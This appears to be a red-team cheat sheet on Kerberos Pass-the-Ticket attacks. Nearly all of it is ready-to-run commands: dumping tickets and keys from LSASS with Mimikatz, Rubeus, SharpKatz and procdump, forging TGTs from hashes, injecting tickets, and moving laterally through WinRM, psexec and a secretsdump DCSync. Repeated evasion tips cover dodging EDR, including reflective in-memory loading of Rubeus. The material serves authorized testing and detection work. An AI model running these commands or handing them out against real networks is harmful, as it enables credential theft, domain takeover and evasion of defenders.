# Pass-the-Ticket (PtT) - Kerberos Ticket Attacks

> _Extract, forge, and inject Kerberos tickets for lateral movement.  
> ⚠️ **Red Team Note**: Mimikatz & Rubeus are heavily signatured. Alternatives provided where possible._

## 📚 Key Concepts

| Term                  | Description                                                                      |
| --------------------- | -------------------------------------------------------------------------------- |
| **TGT**               | Ticket Granting Ticket - proves identity, used to request service tickets        |
| **TGS**               | Ticket Granting Service - grants access to a specific service (CIFS, HTTP, LDAP) |
| **PtT**               | Pass-the-Ticket - inject a stolen ticket into your current session               |
| **OverPass the Hash** | Convert a hash/key into a full TGT (aka Pass-the-Key)                            |

**Detection risks:**

- `sekurlsa::tickets` -> reads LSASS memory (highly detected)
- `asktgt /ptt` -> legitimate Kerberos traffic, but unusual for a non-domain-joined machine
- `createnetonly` -> Logon Type 9 (often flagged)

## Extraction (local admin required)

> _Goal: Dump tickets from LSASS memory._

::: code-group

```bash [Mimikatz (detected)]
privilege::debug
sekurlsa::tickets /export
# Output: [0;xxxxx]-2-0-xxxxxxxx-username@service-domain.kirbi
```

```bash [SharpKatz (less detected)]
# https://github.com/b4rtik/SharpKatz
SharpKatz.exe --Command sekurlsa::tickets /export
```

```bash [Rubeus (Base64, no file)]
Rubeus.exe dump /nowrap
# Output: Base64 ticket ready for injection
```

:::

**Evasion tip:**

- Prefer `Rubeus dump` (no files written to disk) over Mimikatz `.kirbi` files
- If EDR blocks Rubeus, use **dump LSASS + offline extraction**:

```bash
procdump.exe -ma lsass.exe lsass.dmp

# Attacker machine
pypykatz lsa minidump lsass.dmp --kerberos
```

### Extract specific tickets

::: code-group

```bash [By user]
# Mimikatz - only tickets for "john"
sekurlsa::tickets /export /user:john
```

```bash [By service]
# Rubeus - only TGT (krbtgt)
Rubeus.exe dump /service:krbtgt /nowrap
```

```bash [By LUID]
# Mimikatz - specify logon session ID
sekurlsa::tickets /export /luid:0x3e7
```

:::

### Extract Kerberos keys (for OverPass the Hash)

::: code-group

```bash [Mimikatz]
sekurlsa::ekeys
# Outputs AES256, AES128, RC4 keys
```

```bash [SharpKatz]
SharpKatz.exe --Command sekurlsa::ekeys
```

:::

## OverPass the Hash (Hash/Key -> TGT)

> _Goal: Request a TGT using only a hash or key (no password)._

::: code-group

```bash [Rubeus (recommended)]
Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /rc4:$NTLM_HASH /ptt
Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /aes256:$AES256_HMAC /ptt
```

```bash [Kekeo]
kekeo.exe "tgt::ask /user:$USER /domain:$DOMAIN /rc4:$HASH" "exit"
kekeo.exe "kerberos::ptt ticket.kirbi" "exit"
```

```bash [Mimikatz (creates new window)]
sekurlsa::pth /domain:$DOMAIN /user:$USER /ntlm:$NTLM_HASH
# New cmd.exe window opens - use it for lateral movement
```

```bash [Rubeus - Base64 only (no import)]
Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /aes256:$AES256_HMAC /nowrap
```

:::

**Evasion tip:**

- `aes256` is stealthier than `rc4` (downgrade detection)
- Avoid `/ptt` if you want to inspect the ticket first - use `/nowrap` then manual injection
- **Alternative**: Use `getTGT.py` from Impacket (Linux) to request TGT without touching LSASS

## Pass-the-Ticket (Inject .kirbi or Base64)

> _Goal: Inject a stolen ticket into your current session._

::: code-group

```bash [Mimikatz - from .kirbi]
kerberos::ptt "$PATH_TO_KIRBI"
# Ticket now in LSASS - test with: klist
```

```bash [Rubeus - from .kirbi]
Rubeus.exe ptt /ticket:$PATH_TO_KIRBI
```

```bash [Rubeus - from Base64]
Rubeus.exe ptt /ticket:$BASE64_TICKET
```

:::

**Verify injection:**

```bash
klist
# Should show the imported ticket
```

**Evasion tip:**

- The ticket stays in LSASS even after Mimikatz/Rubeus exits
- Ticket expires after 10 hours (TGT default) - monitor `EndTime` with `klist`
- **Evasion**: Inject via PowerShell reflection instead of dropping binaries:

```powershell
[Reflection.Assembly]::Load([Convert]::FromBase64String($base64_rubeus)) | Out-Null
[Rubeus.Program]::Main(@("ptt", "/ticket:$BASE64_TICKET"))
```

## Lateral Movement with Ticket

> _Goal: Use the injected ticket to access remote resources._

### PowerShell Remoting (WinRM)

```bash
# After ticket injection
powershell
Enter-PSSession -ComputerName $TARGET_IP
```

**Prerequisites:**

- WinRM enabled (`Enable-PSRemoting` - needs admin)
- User in `Remote Management Users` group
- Ticket must have SPN for `HTTP/$TARGET` or `WSMAN/$TARGET`

**If WinRM is not enabled:**

```bash
# Enable remotely (requires admin on target)
nxc winrm $TARGET_IP -u $USER -H $NTLM_HASH -x "Enable-PSRemoting -Force"
```

### Create netonly process (Rubeus)

> _⚠️ Highly detected (Logon Type 9). Prefer other methods if possible._

```bash
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
# New window appears -> run asktgt /ptt inside it
```

**Alternative (less noisy):**

```bash
# Use runas /netonly + manual ticket injection
runas /netonly /user:$DOMAIN\$USER cmd.exe
# In new window: inject ticket with Rubeus/Mimikatz
```

## Linux Side - Convert & Use Tickets

> _Goal: Use Windows tickets on Linux for Impacket tools._

### Convert .kirbi -> .ccache

```bash
# Using Impacket
impacket-ticketConverter ticket.kirbi ticket.ccache

# Using kirbi2ccache.py (PKINITtools)
python3 kirbi2ccache.py ticket.kirbi ticket.ccache
```

### Use ticket with Impacket

```bash
export KRB5CCNAME=/path/to/ticket.ccache
klist  # Verify

# SMB
impacket-smbclient -k -no-pass -dc-ip $DC_IP $DOMAIN/$USER@$TARGET

# PSExec
impacket-psexec -k -no-pass -dc-ip $DC_IP $DOMAIN/$USER@$TARGET

# Secretsdump (DCSync)
impacket-secretsdump -k -no-pass -dc-ip $DC_IP $DOMAIN/$USER@$DC_IP
```

### Configure /etc/krb5.conf for Kerberos

```ini
[libdefaults]
    default_realm = $DOMAIN
    dns_lookup_realm = false
    dns_lookup_kdc = false
    rdns = false

[realms]
    $DOMAIN = {
        kdc = $DC_IP
        admin_server = $DC_IP
    }

[domain_realm]
    .$DOMAIN_LOWER = $DOMAIN
    $DOMAIN_LOWER = $DOMAIN
```
